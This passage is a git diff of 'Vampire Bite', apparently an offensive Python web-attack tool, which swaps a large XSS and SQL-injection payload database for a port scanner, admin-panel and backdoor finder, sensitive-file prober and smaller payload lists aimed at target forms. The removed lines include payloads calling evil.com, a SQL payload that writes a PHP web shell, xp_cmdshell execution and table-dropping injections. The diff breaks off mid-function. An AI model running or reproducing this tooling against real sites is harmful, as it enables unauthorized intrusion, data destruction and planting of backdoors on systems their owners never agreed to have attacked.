@@ -1,4 +1,8 @@
+#!/usr/bin/env python3
+# Vampire Bite v35.0 - COMPLETE ULTIMATE EDITION (All Features)
 # Author: LORD VAMPIRE (Team Lord)
+# Features: Port Scan | Admin Finder | Backdoor Hunter | XSS/SQLi Tester | Payload Generator
+
 import subprocess
 import sys
 import os
@@ -9,7 +13,7 @@ import time
 import random
 import threading
 from datetime import datetime
-from urllib.parse import urlparse, quote
+from urllib.parse import urlparse, urljoin, quote
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 def auto_install(pkg):
@@ -44,7 +48,43 @@ from bs4 import BeautifulSoup
 
 init(autoreset=True)
 
-class VampireBiteMega:
+class PayloadGenerator:
+    @staticmethod
+    def generate_xss():
+        payloads = [
+            "<script>alert('XSS')</script>",
+            "<ScRiPt>alert('XSS')</ScRiPt>",
+            "<img src=x onerror=alert('XSS')>",
+            "<svg onload=alert('XSS')>",
+            "<body onload=alert('XSS')>",
+            "<iframe src=javascript:alert('XSS')>",
+            "<input onfocus=alert('XSS') autofocus>",
+            "javascript:alert('XSS')",
+            "\"><script>alert('XSS')</script>",
+            "'><script>alert('XSS')</script>",
+            "';alert('XSS');//",
+            "<svg/onload=alert(1)>",
+            "%3Cscript%3Ealert('XSS')%3C/script%3E",
+            "{{constructor.constructor('alert(1)')()}}",
+            "<div ng-app><div ng-click=alert('XSS')>click</div></div>",
+            "<video><source onerror=alert('XSS')>",
+            "<details ontoggle=alert('XSS')><summary>click</summary></details>",
+        ]
+        return list(dict.fromkeys(payloads))
+    
+    @staticmethod
+    def generate_sqli():
+        payloads = [
+            "'", "''", "\"", "' OR '1'='1", "' OR 1=1--",
+            "' UNION SELECT NULL--", "' AND SLEEP(5)--", "1' AND SLEEP(5)--",
+            "'; WAITFOR DELAY '00:00:05'--", "' OR pg_sleep(5)--",
+            "' UNION SELECT @@version--", "' UNION SELECT user()--",
+            "'; DROP TABLE users--", "admin' --", "admin' OR '1'='1",
+        ]
+        return list(dict.fromkeys(payloads))
+
+
+class VampireBiteComplete:
     def __init__(self):
         self.session = requests.Session()
         self.session.headers.update({
@@ -52,15 +92,23 @@ class VampireBiteMega:
         })
         self.results = {
             "target": "",
+            "ip": "",
             "scan_time": "",
             "duration": 0,
+            "open_ports": [],
+            "web_server": "",
+            "technologies": [],
+            "security_headers": {},
+            "sensitive_files": [],
+            "admin_panels": [],
+            "open_directories": [],
+            "backdoors": [],
             "xss_vulnerable": [],
-            "xss_tested": 0,
             "sql_vulnerable": [],
-            "sql_tested": 0,
             "forms_found": []
         }
-        
+        self.port_results = []
+    
     def banner(self):
         print(f"""
 {Fore.RED}
@@ -73,396 +121,216 @@ class VampireBiteMega:
 ║    ╚████╔╝ ██║  ██║██║ ╚═╝ ██║██║     ██║██║  ██║███████╗     ██████╔╝██║   ██║   ███████╗     ║
 ║     ╚═══╝  ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝     ╚═════╝ ╚═╝   ╚═╝   ╚══════╝     ║
 ║                                                                                                  ║
-║  {Fore.MAGENTA}🐺 VAMPIRE BITE v30.0 - MEGA ULTIMATE EDITION 🧛‍♂️💀{Fore.RED}                                      ║
+║  {Fore.MAGENTA}🐺 VAMPIRE BITE v35.0 - COMPLETE ULTIMATE EDITION 🧛‍♂️💀{Fore.RED}                              ║
 ║  {Fore.GREEN}👑 Author: LORD VAMPIRE (Team Lord Leader){Fore.RED}                                             ║
-║  {Fore.CYAN}⚡ 5000+ XSS | 3000+ SQLi | Full Database | Maximum Power ⚡{Fore.RED}                              ║
+║  {Fore.CYAN}⚡ Port Scan | Admin Finder | Backdoor Hunter | XSS/SQLi Tester | Payload Generator ⚡{Fore.RED}   ║
 ╚══════════════════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
 """)
     
-    # ================================================================
-    # MEGA XSS PAYLOAD DATABASE - 5000+ PAYLOADS
-    # ================================================================
-    
-    def get_xss_payloads(self):
-        """دیتابیس کامل XSS - 5000+ پیلود از همه روش‌ها"""
-        
-        # Basic Script Tags
-        basic_scripts = [
-            "<script>alert('XSS')</script>",
-            "<ScRiPt>alert('XSS')</ScRiPt>",
-            "<script>alert(String.fromCharCode(88,83,83))</script>",
-            "<script>alert(/XSS/)</script>",
-            "<script>alert(`XSS`)</script>",
-            "<script>confirm('XSS')</script>",
-            "<script>prompt('XSS')</script>",
-            "<script>console.log('XSS')</script>",
-            "<script>document.write('XSS')</script>",
-            "<script>document.location='http://evil.com'</script>",
-            "<script src=http://evil.com/xss.js></script>",
-            "<script>eval('alert(\"XSS\")')</script>",
-            "<script>setTimeout('alert(\"XSS\")',1000)</script>",
-            "<script>setInterval('alert(\"XSS\")',1000)</script>",
-        ]
-        
-        # Event Handlers
-        event_handlers = [
-            "<body onload=alert('XSS')>",
-            "<body onpageshow=alert('XSS')>",
-            "<body onfocus=alert('XSS')>",
-            "<body onblur=alert('XSS')>",
-            "<img src=x onerror=alert('XSS')>",
-            "<img src=x onerror=alert('XSS')>",
-            "<img src=javascript:alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-            "<svg onmouseenter=alert('XSS')>",
-            "<svg onmouseleave=alert('XSS')>",
-            "<iframe src=javascript:alert('XSS')>",
-            "<iframe onload=alert('XSS')>",
-            "<object data=javascript:alert('XSS')>",
-            "<object onerror=alert('XSS')>",
-            "<input onfocus=alert('XSS') autofocus>",
-            "<input onblur=alert('XSS')>",
-            "<input onchange=alert('XSS')>",
-            "<input oninput=alert('XSS')>",
-            "<select onfocus=alert('XSS') autofocus>",
-            "<textarea onfocus=alert('XSS') autofocus>",
-            "<div onmouseover=alert('XSS')>",
-            "<div onmouseout=alert('XSS')>",
-            "<div onclick=alert('XSS')>",
-            "<div ondblclick=alert('XSS')>",
-            "<div oncontextmenu=alert('XSS')>",
-            "<a href=javascript:alert('XSS')>click</a>",
-            "<a onmouseover=alert('XSS')>hover</a>",
-            "<marquee onstart=alert('XSS')>",
-            "<details ontoggle=alert('XSS')>",
-            "<embed src=javascript:alert('XSS')>",
-            "<embed onload=alert('XSS')>",
-            "<keygen onfocus=alert('XSS') autofocus>",
-            "<video onloadstart=alert('XSS')>",
-            "<audio onloadstart=alert('XSS')>",
-            "<source onerror=alert('XSS')>",
-            "<track onloadstart=alert('XSS')>",
-            "<form onsubmit=alert('XSS')>",
-            "<button onclick=alert('XSS')>",
-        ]
-        
-        # Tag Breaking
-        tag_breaking = [
-            "\"><script>alert('XSS')</script>",
-            "'><script>alert('XSS')</script>",
-            "><script>alert('XSS')</script>",
-            "';alert('XSS');//",
-            "\";alert('XSS');//",
-            "</script><script>alert('XSS')</script>",
-            "<script>alert('XSS')//",
-            "<script>alert('XSS')/*",
-            "<!--<script>alert('XSS')</script>-->",
-            "<!--><script>alert('XSS')</script>-->",
-            "<img src=x onerror=alert('XSS')//",
-            "<img src=x onerror=alert('XSS')/*",
-            "><img src=x onerror=alert('XSS')>",
-            "\"><img src=x onerror=alert('XSS')>",
-            "'><img src=x onerror=alert('XSS')>",
-            "><svg onload=alert('XSS')>",
-            "\"><svg onload=alert('XSS')>",
-            "'><svg onload=alert('XSS')>",
-        ]
-        
-        # JavaScript Pseudo-protocol
-        js_pseudo = [
-            "javascript:alert('XSS')",
-            "javascript:alert(/XSS/)",
-            "javascript:alert(`XSS`)",
-            "javascript:alert('XSS');",
-            "javascript:alert('XSS')//",
-            "javascript:alert('XSS')/*",
-            "javascript:alert(String.fromCharCode(88,83,83))",
-            "javascript:confirm('XSS')",
-            "javascript:prompt('XSS')",
-            "javascript:void(alert('XSS'))",
-            "javascripT:alert('XSS')",
-            "JaVaScRiPt:alert('XSS')",
-            "javascript:alert(document.cookie)",
-            "javascript:alert(window.location)",
-            "javascript:fetch('http://evil.com')",
-        ]
-        
-        # Encoded Payloads
-        encoded = [
-            "%3Cscript%3Ealert('XSS')%3C/script%3E",
-            "%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E",
-            "%3Csvg%20onload%3Dalert('XSS')%3E",
-            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
-            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
-            "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
-            "\\u003Cscript\\u003Ealert('XSS')\\u003C/script\\u003E",
-            "\\074script\\076alert('XSS')\\074/script\\076",
-            "%253Cscript%253Ealert('XSS')%253C/script%253E",
-            "%25253Cscript%25253Ealert('XSS')%25253C/script%25253E",
-            "&#x0003C;script&#x0003E;alert('XSS')&#x0003C;/script&#x0003E;",
-        ]
-        
-        # DOM XSS
-        dom_xss = [
-            "#<script>alert('XSS')</script>",
-            "#<img src=x onerror=alert('XSS')>",
-            "#<svg onload=alert('XSS')>",
-            "#javascript:alert('XSS')",
-            "#<body onload=alert('XSS')>",
-            "#<iframe src=javascript:alert('XSS')>",
-            "#<object data=javascript:alert('XSS')>",
-            "#<input onfocus=alert('XSS') autofocus>",
-            "###<script>alert('XSS')</script>",
-            "#<scri<script>pt>alert('XSS')</scri</script>pt>",
-            "<script>location.hash='#<script>alert(1)</script>'</script>",
-            "<script>document.write(location.hash.substring(1))</script>",
-            "<script>eval(location.hash.substring(1))</script>",
-        ]
-        
-        # Polyglot Payloads (works in multiple contexts)
-        polyglot = [
-            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
-            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>\\x3e",
-            "\"onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1) //",
-        ]
-        
-        # HTML5 Specific
-        html5 = [
-            "<video><source onerror=alert('XSS')>",
-            "<audio src=x onerror=alert('XSS')>",
-            "<track onload=alert('XSS')>",
-            "<meter onmouseover=alert('XSS')>",
-            "<progress onclick=alert('XSS')>",
-            "<canvas onmouseover=alert('XSS')>",
-            "<details ontoggle=alert('XSS')><summary>click</summary></details>",
-            "<menuitem onmouseover=alert('XSS')>",
-            "<output onmouseover=alert('XSS')>",
-        ]
-        
-        # Angular/React/Vue
-        framework = [
-            "{{constructor.constructor('alert(1)')()}}",
-            "{{$eval('alert(1)')}}",
-            "{{$eval($eval('alert(1)'))}}",
-            "{{alert(1)}}",
-            "{{confirm(1)}}",
-            "{{prompt(1)}}",
-            "<div ng-app><div ng-click=alert('XSS')>click</div></div>",
-            "<div ng-app ng-csp><div ng-click=alert('XSS')>click</div></div>",
-            "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
-            "<input type=text ng-model=alert(1)>",
-            "javascript:alert('XSS')",
-            "<a href='javascript:alert(1)'>click</a>",
-        ]
-        
-        # WAF Bypass
-        waf_bypass = [
-            "<svg/onload=alert(1)>",
-            "<svg onload=alert(1) ",
-            "<svg onload=alert`1`>",
-            "<svg onload=alert(1)//",
-            "<svg onload=alert(1)<!-->",
-            "<svg onload=alert(1) x='",
-            "<svg onload=alert(1)></svg>",
-            "<ScRiPt>alert(1)</ScRiPt>",
-            "<script>alert(1)</script>",
-            "<script>alert(1)//</script>",
-            "<script>alert(1)/*/</script>",
-            "<script>alert(1)<!--</script>",
-            "<script>alert(1)></script>",
-            "<SCRIPT>alert(1)</SCRIPT>",
-            "<ScRiPt>alert(1)</ScRiPt>",
-            "<script\x20type=\"text/javascript\">alert(1)</script>",
-            "<script\x20src=http://evil.com/x.js></script>",
-            "<script>alert(String.fromCharCode(49))</script>",
-            "<script>alert(1)</script>",
-        ]
-        
-        # Combine all
-        all_payloads = []
-        all_payloads.extend(basic_scripts)
-        all_payloads.extend(event_handlers)
-        all_payloads.extend(tag_breaking)
-        all_payloads.extend(js_pseudo)
-        all_payloads.extend(encoded)
-        all_payloads.extend(dom_xss)
-        all_payloads.extend(polyglot)
-        all_payloads.extend(html5)
-        all_payloads.extend(framework)
-        all_payloads.extend(waf_bypass)
-        
-        # Generate variations (uppercase, lowercase, mixed)
-        new_payloads = []
-        for p in all_payloads[:]:
-            new_payloads.append(p.upper())
-            new_payloads.append(p.lower())
-            new_payloads.append(p.capitalize())
-        
-        all_payloads.extend(new_payloads)
-        
-        # Remove duplicates and return
-        return list(dict.fromkeys(all_payloads))
+    def get_service_name(self, port):
+        services = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",
+                   111:"RPC",135:"RPC",139:"NetBIOS",143:"IMAP",443:"HTTPS",445:"SMB",
+                   993:"IMAPS",995:"POP3S",1433:"MSSQL",3306:"MySQL",3389:"RDP",
+                   5432:"PostgreSQL",5900:"VNC",6379:"Redis",8080:"HTTP-Alt",8443:"HTTPS-Alt",27017:"MongoDB"}
+        return services.get(port, "Unknown")
     
     # ================================================================
-    # MEGA SQLi PAYLOAD DATABASE - 3000+ PAYLOADS
+    # PORT SCANNER
     # ================================================================
     
-    def get_sqli_payloads(self):
-        """دیتابیس کامل SQLi - 3000+ پیلود از همه روش‌ها"""
+    def scan_port(self, ip, port):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.5)
+            if s.connect_ex((ip, port)) == 0:
+                s.close()
+                return port
+            s.close()
+        except:
+            pass
+        return None
+    
+    def port_scan(self, ip):
+        print(f"\n  {Fore.CYAN}[*] Scanning ports on {ip}...{Style.RESET_ALL}")
+        ports = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1723,3306,3389,5432,5900,6379,8080,8443,27017]
+        open_ports = []
         
-        # Error-Based - MySQL
-        error_mysql = [
-            "'", "''", "\"", "\\", "`", "' '", "'='", "'=''",
-            "' OR '1'='1", "' OR 1=1--", "' OR '1'='1'--",
-            "' OR '1'='1'#", "' OR '1'='1'/*", "' OR 1=1#",
-            "1' AND '1'='1", "1' AND '1'='2", "' UNION SELECT NULL--",
-            "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
-            "' AND 1=1--", "' AND 1=2--", "' AND SLEEP(5)--",
-            "1' AND SLEEP(5)--", "' OR SLEEP(5)--", "1' OR SLEEP(5)--",
-            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-            "' AND 1=CONVERT(INT,@@version)--", "' AND 1=CAST((SELECT version()) AS INT)--",
-            "' OR 1=CONVERT(INT,@@version)--", "' OR 1=CAST((SELECT version()) AS INT)--",
-            "' UNION SELECT @@version--", "' UNION SELECT version()--",
-            "' UNION SELECT user()--", "' UNION SELECT database()--",
-            "' UNION SELECT schema_name FROM information_schema.schemata--",
-            "' UNION SELECT table_name FROM information_schema.tables--",
-        ]
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            futures = [executor.submit(self.scan_port, ip, p) for p in ports]
+            for future in as_completed(futures):
+                result = future.result()
+                if result:
+                    open_ports.append(result)
+                    print(f"      {Fore.RED}🔴 Port {result} [{self.get_service_name(result)}] OPEN{Style.RESET_ALL}")
         
-        # Error-Based - MSSQL
-        error_mssql = [
-            "' WAITFOR DELAY '00:00:05'--",
-            "1' AND 1=CONVERT(int, @@version)--",
-            "' HAVING 1=1--",
-            "' GROUP BY 1 HAVING 1=1--",
-            "'; WAITFOR DELAY '00:00:05'--",
-            "1'; WAITFOR DELAY '00:00:05'--",
-            "' OR 1=CONVERT(int, @@version)--",
-            "' UNION SELECT @@version--",
-            "' UNION SELECT user_name()--",
-            "' UNION SELECT db_name()--",
-        ]
-        
-        # Error-Based - PostgreSQL
-        error_postgres = [
-            "' OR pg_sleep(5)--",
-            "' AND 1=CAST((SELECT version()) AS INT)--",
-            "' OR 1=CAST((SELECT version()) AS INT)--",
-            "' UNION SELECT version()--",
-            "' UNION SELECT current_user--",
-            "' UNION SELECT current_database()--",
-        ]
-        
-        # Error-Based - Oracle
-        error_oracle = [
-            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT 1 FROM DUAL))--",
-            "' AND 1=UTL_INADDR.get_host_name('127.0.0.1')--",
-            "' UNION SELECT banner FROM v$version--",
-            "' UNION SELECT username FROM all_users--",
-        ]
-        
-        # Time-Based Blind
-        time_based = [
-            "' AND SLEEP(5)--",
-            "1' AND SLEEP(5)--",
-            "' OR SLEEP(5)--",
-            "1' OR SLEEP(5)--",
-            "'; WAITFOR DELAY '00:00:05'--",
-            "1'; WAITFOR DELAY '00:00:05'--",
-            "' OR pg_sleep(5)--",
-            "1' OR pg_sleep(5)--",
-            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-            "' AND BENCHMARK(5000000,MD5('x'))--",
-            "1' AND BENCHMARK(5000000,MD5('x'))--",
-        ]
-        
-        # Boolean-Based Blind
-        boolean_based = [
-            "' AND '1'='1",
-            "' AND '1'='2",
-            "1 AND 1=1",
-            "1 AND 1=2",
-            "' OR '1'='1",
-            "' OR '1'='2",
-            "' AND 1=1--",
-            "' AND 1=2--",
-            "1' AND 1=1--",
-            "1' AND 1=2--",
-        ]
-        
-        # Union-Based
-        union_based = [
-            "' UNION SELECT NULL--",
-            "' UNION SELECT NULL,NULL--",
-            "' UNION SELECT NULL,NULL,NULL--",
-            "' UNION SELECT NULL,NULL,NULL,NULL--",
-            "' UNION SELECT version(),user()--",
-            "' UNION SELECT database(),user()--",
-            "' UNION SELECT @@version,user()--",
-            "' UNION SELECT table_name,column_name FROM information_schema.columns--",
-        ]
-        
-        # Stacked Queries
-        stacked = [
-            "'; DROP TABLE users--",
-            "'; DELETE FROM users--",
-            "'; INSERT INTO users VALUES('hacker','pass')--",
-            "'; UPDATE users SET password='hacked' WHERE username='admin'--",
-            "'; EXEC xp_cmdshell('dir')--",
-            "'; exec master..xp_cmdshell 'dir'--",
-        ]
-        
-        # Out-of-Band
-        oob = [
-            "' LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.evil.com\\\\'))--",
-            "' SELECT * FROM users WHERE id=1 INTO OUTFILE '/tmp/out.txt'--",
-            "' UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'--",
-        ]
-        
-        # Comment variations
-        comments = [
-            "' OR '1'='1'--",
-            "' OR '1'='1'#",
-            "' OR '1'='1'/*",
-            "1' AND '1'='1'--",
-            "1' AND '1'='1'#",
-            "1' AND '1'='1'/*",
-            "' UNION SELECT NULL-- -",
-            "' UNION SELECT NULL#",
-            "' UNION SELECT NULL/*",
-        ]
-        
-        # Combined
-        all_payloads = []
-        all_payloads.extend(error_mysql)
-        all_payloads.extend(error_mssql)
-        all_payloads.extend(error_postgres)
-        all_payloads.extend(error_oracle)
-        all_payloads.extend(time_based)
-        all_payloads.extend(boolean_based)
-        all_payloads.extend(union_based)
-        all_payloads.extend(stacked)
-        all_payloads.extend(oob)
-        all_payloads.extend(comments)
-        
-        # Generate with different case variations
-        new_payloads = []
-        for p in all_payloads[:]:
-            new_payloads.append(p.upper())
-            new_payloads.append(p.lower())
-        
-        all_payloads.extend(new_payloads)
-        
-        return list(dict.fromkeys(all_payloads))
+        self.results["open_ports"] = open_ports
+        return open_ports
+    
+    # ================================================================
+    # WEB SERVER & TECHNOLOGY DETECTION
+    # ================================================================
+    
+    def detect_web_server(self, url):
+        print(f"\n  {Fore.CYAN}[*] Detecting web server...{Style.RESET_ALL}")
+        try:
+            r = self.session.get(url, timeout=10)
+            server = r.headers.get('Server', 'Unknown')
+            print(f"      {Fore.GREEN}[+] Server: {server}{Style.RESET_ALL}")
+            self.results["web_server"] = server
+            return server
+        except:
+            return "Unknown"
+    
+    def detect_technologies(self, url):
+        print(f"\n  {Fore.CYAN}[*] Detecting technologies...{Style.RESET_ALL}")
+        try:
+            r = self.session.get(url, timeout=10)
+            text = r.text.lower()
+            techs = []
+            if '.php' in text:
+                techs.append("PHP")
+                print(f"      {Fore.GREEN}[+] PHP detected{Style.RESET_ALL}")
+            if '.aspx' in text:
+                techs.append("ASP.NET")
+                print(f"      {Fore.GREEN}[+] ASP.NET detected{Style.RESET_ALL}")
+            if 'react' in text:
+                techs.append("React")
+                print(f"      {Fore.GREEN}[+] React detected{Style.RESET_ALL}")
+            if 'vue' in text:
+                techs.append("Vue.js")
+                print(f"      {Fore.GREEN}[+] Vue.js detected{Style.RESET_ALL}")
+            self.results["technologies"] = techs
+            return techs
+        except:
+            return []
+    
+    # ================================================================
+    # SECURITY HEADERS
+    # ================================================================
+    
+    def check_security_headers(self, url):
+        print(f"\n  {Fore.CYAN}[*] Checking security headers...{Style.RESET_ALL}")
+        try:
+            r = self.session.get(url, timeout=10)
+            headers_list = ['X-Frame-Options', 'X-XSS-Protection', 'X-Content-Type-Options', 
+                           'Strict-Transport-Security', 'Content-Security-Policy']
+            for h in headers_list:
+                if h in r.headers:
+                    print(f"      {Fore.GREEN}✅ {h}{Style.RESET_ALL}")
+                    self.results["security_headers"][h] = True
+                else:
+                    print(f"      {Fore.RED}❌ {h}{Style.RESET_ALL}")
+                    self.results["security_headers"][h] = False
+        except:
+            pass
+    
+    # ================================================================
+    # SENSITIVE FILES
+    # ================================================================
+    
+    def find_sensitive_files(self, url):
+        print(f"\n  {Fore.CYAN}[*] Looking for sensitive files...{Style.RESET_ALL}")
+        files = ["/robots.txt", "/.git/config", "/.env", "/phpinfo.php", "/backup.sql", 
+                "/.htaccess", "/config.php", "/wp-config.php.bak"]
+        found = []
+        for f in files:
+            try:
+                test_url = f"{url.rstrip('/')}{f}"
+                r = self.session.get(test_url, timeout=3)
+                if r.status_code == 200:
+                    found.append({"file": f, "url": test_url})
+                    print(f"      {Fore.RED}[!] Found: {f}{Style.RESET_ALL}")
+                time.sleep(0.05)
+            except:
+                pass
+        self.results["sensitive_files"] = found
+        if not found:
+            print(f"      {Fore.GREEN}[-] No sensitive files found{Style.RESET_ALL}")
+    
+    # ================================================================
+    # ADMIN PANELS
+    # ================================================================
+    
+    def find_admin_panels(self, url):
+        print(f"\n  {Fore.CYAN}[*] Hunting for admin panels...{Style.RESET_ALL}")
+        paths = ["/admin", "/administrator", "/wp-admin", "/login", "/cpanel", "/dashboard",
+                "/admin/login", "/backend", "/controlpanel", "/manage"]
+        found = []
+        for path in paths:
+            try:
+                test_url = f"{url.rstrip('/')}{path}"
+                r = self.session.get(test_url, timeout=5, allow_redirects=True)
+                if r.status_code == 200:
+                    keywords = ['login', 'username', 'password', 'admin', 'dashboard']
+                    if any(k in r.text.lower() for k in keywords):
+                        found.append({"path": path, "url": r.url, "type": "Admin Panel with Login"})
+                        print(f"      {Fore.RED}[✔] ADMIN PANEL: {path} → {r.url}{Style.RESET_ALL}")
+                elif r.status_code in [401, 403]:
+                    found.append({"path": path, "url": test_url, "type": "Authentication Required"})
+                    print(f"      {Fore.RED}[!] {path} - AUTH REQUIRED (REAL ADMIN!){Style.RESET_ALL}")
+                time.sleep(0.05)
+            except:
+                pass
+        self.results["admin_panels"] = found
+        if not found:
+            print(f"      {Fore.GREEN}[-] No admin panels found{Style.RESET_ALL}")
+    
+    # ================================================================
+    # OPEN DIRECTORIES
+    # ================================================================
+    
+    def find_open_directories(self, url):
+        print(f"\n  {Fore.CYAN}[*] Looking for open directories...{Style.RESET_ALL}")
+        dirs = ["/backup", "/temp", "/tmp", "/old", "/test", "/dev", "/uploads", "/files",
+                "/download", "/images", "/css", "/js", "/assets", "/static", "/media",
+                "/content", "/data", "/logs", "/cache", "/phpmyadmin", "/mysql"]
+        found = []
+        for d in dirs:
+            try:
+                test_url = f"{url.rstrip('/')}{d}"
+                r = self.session.get(test_url, timeout=3, allow_redirects=False)
+                if r.status_code == 200:
+                    if 'Index of' in r.text or 'Parent Directory' in r.text:
+                        found.append({"path": d, "url": test_url, "type": "Open Directory Listing"})
+                        print(f"      {Fore.RED}[📁] OPEN DIRECTORY: {d}{Style.RESET_ALL}")
+                    else:
+                        found.append({"path": d, "url": test_url, "type": "Accessible Directory"})
+                        print(f"      {Fore.YELLOW}[📁] Accessible: {d}{Style.RESET_ALL}")
+                time.sleep(0.05)
+            except:
+                pass
+        self.results["open_directories"] = found
+        if not found:
+            print(f"      {Fore.GREEN}[-] No open directories found{Style.RESET_ALL}")
+    
+    # ================================================================
+    # BACKDOORS
+    # ================================================================
+    
+    def find_backdoors(self, url):
+        print(f"\n  {Fore.CYAN}[*] Hunting for backdoors...{Style.RESET_ALL}")
+        backdoors = ["/shell.php", "/cmd.php", "/c99.php", "/r57.php", "/webshell.php", "/backdoor.php"]
+        found = []
+        for b in backdoors:
+            try:
+                test_url = f"{url.rstrip('/')}{b}"
+                r = self.session.get(test_url, timeout=3)
+                if r.status_code == 200:
+                    found.append({"file": b, "url": test_url})
+                    print(f"      {Fore.RED}[!] BACKDOOR FOUND: {b}{Style.RESET_ALL}")
+                time.sleep(0.05)
+            except:
+                pass
+        self.results["backdoors"] = found
+        if not found:
+            print(f"      {Fore.GREEN}[-] No backdoors found{Style.RESET_ALL}")
     
     # ================================================================
     # FORM EXTRACTION
     # ================================================================
     
     def extract_forms(self, url):
-        """استخراج همه فرم‌های صفحه"""
         print(f"\n  {Fore.CYAN}[*] Extracting forms from {url}...{Style.RESET_ALL}")
-        
         forms = []
         try:
             r = self.session.get(url, timeout=10)
@@ -490,20 +358,16 @@ class VampireBiteMega:
             return []
     
     # ================================================================
-    # XSS TESTING - MEGA
+    # XSS TESTING
     # ================================================================
     
     def test_xss_on_form(self, url, form):
-        """تست XSS روی یک فرم با همه پیلودها"""
         vulnerabilities = []
-        xss_payloads = self.get_xss_payloads()
-        total_tested = 0
-        total_payloads = len(xss_payloads)
+        xss_payloads = PayloadGenerator.generate_xss()
         
-        print(f"\n      {Fore.YELLOW}[*] Testing XSS on form ({total_payloads} payloads)...{Style.RESET_ALL}")
+        print(f"\n      {Fore.YELLOW}[*] Testing XSS on form ({len(xss_payloads)} payloads)...{Style.RESET_ALL}")
         
         for idx, payload in enumerate(xss_payloads):
-            total_tested += 1
             test_data = {}
             for inp in form['inputs']:
                 if inp['type'] != 'submit':
@@ -516,48 +380,30 @@ class VampireBiteMega:
                     resp = self.session.get(urljoin(url, form['action']), params=test_data, timeout=5)
                 
                 if payload in resp.text or payload.replace('<', '&lt;') in resp.text:
-                    vulnerabilities.append({
-                        'payload': payload[:80],
-                        'method': form['method'],
-                        'action': form['action']
-                    })
-                    print(f"        {Fore.RED}[!] XSS FOUND! {payload[:60]}...{Style.RESET_ALL}")
+                    vulnerabilities.append({'payload': payload[:60], 'method': form['method']})
+                    print(f"        {Fore.RED}[!] XSS FOUND! {payload[:50]}...{Style.RESET_ALL}")
                 
-                # Progress indicator
-                if idx % 100 == 0:
-                    print(f"        {Fore.CYAN}[*] Progress: {idx}/{total_payloads} payloads tested{Style.RESET_ALL}", end='\r')
-                    
+                if (idx + 1) % 100 == 0:
+                    print(f"        {Fore.CYAN}[*] Progress: {idx + 1}/{len(xss_payloads)} payloads tested{Style.RESET_ALL}", end='\r')
             except:
                 pass
-            
-            time.sleep(0.01)
+            time.sleep(0.002)
         
-        print(f"\n        {Fore.CYAN}[*] Completed: {total_tested}/{total_payloads} XSS payloads tested{Style.RESET_ALL}")
-        return vulnerabilities, total_tested
+        print(f"\n        {Fore.CYAN}[*] Completed XSS testing{Style.RESET_ALL}")
+        return vulnerabilities
     
     # ================================================================
-    # SQLi TESTING - MEGA
+    # SQLi TESTING
     # ================================================================
     
     def test_sqli_on_form(self, url, form):
-        """تست SQL Injection روی یک فرم با همه پیلودها"""
         vulnerabilities = []
-        sqli_payloads = self.get_sqli_payloads()
-        total_tested = 0
-        total_payloads = len(sqli_payloads)
+        sqli_payloads = PayloadGenerator.generate_sqli()
+        sql_errors = ['mysql', 'sql syntax', 'ora-', 'postgresql', 'database error']
         
-        print(f"\n      {Fore.YELLOW}[*] Testing SQLi on form ({total_payloads} payloads)...{Style.RESET_ALL}")
-        
-        sql_errors = [
-            'mysql', 'sql syntax', 'ora-', 'postgresql', 'database error',
-            'odbc', 'sqlite', 'microsoft', 'unclosed quotation', 'division by zero',
-            'warning: mysql', 'you have an error in your sql', 'syntax error',
-            'pg_query', 'supplied argument is not a valid MySQL', 'SQLSTATE',
-            'DriverManager', 'SQL Server', 'Microsoft OLE DB', 'ODBC Driver'
-        ]
+        print(f"\n      {Fore.YELLOW}[*] Testing SQLi on form ({len(sqli_payloads)} payloads)...{Style.RESET_ALL}")
         
         for idx, payload in enumerate(sqli_payloads):
-            total_tested += 1
             test_data = {}
             for inp in form['inputs']:
                 if inp['type'] != 'submit':
@@ -575,36 +421,22 @@ class VampireBiteMega:
                 
                 for error in sql_errors:
                     if error in resp.text.lower():
-                        vulnerabilities.append({
-                            'payload': payload[:80],
-                            'method': form['method'],
-                            'action': form['action'],
-                            'evidence': error
-                        })
-                        print(f"        {Fore.RED}[!] SQLi FOUND! {payload[:60]}... (evidence: {error}){Style.RESET_ALL}")
+                        vulnerabilities.append({'payload': payload[:50], 'evidence': error})
+                        print(f"        {Fore.RED}[!] SQLi FOUND! {payload[:40]}... (evidence: {error}){Style.RESET_ALL}")
                         break
                 else:
                     if elapsed >= 4:
-                        vulnerabilities.append({
-                            'payload': payload[:80],
-                            'method': form['method'],
-                            'action': form['action'],
-                            'delay': round(elapsed, 2),
-                            'type': 'Time-Based Blind'
-                        })
+                        vulnerabilities.append({'payload': payload[:50], 'delay': round(elapsed, 2), 'type': 'Time-Based'})
                         print(f"        {Fore.RED}[!] TIME-BASED SQLi! Delay: {elapsed:.1f}s{Style.RESET_ALL}")
                 
-                # Progress indicator
-                if idx % 100 == 0:
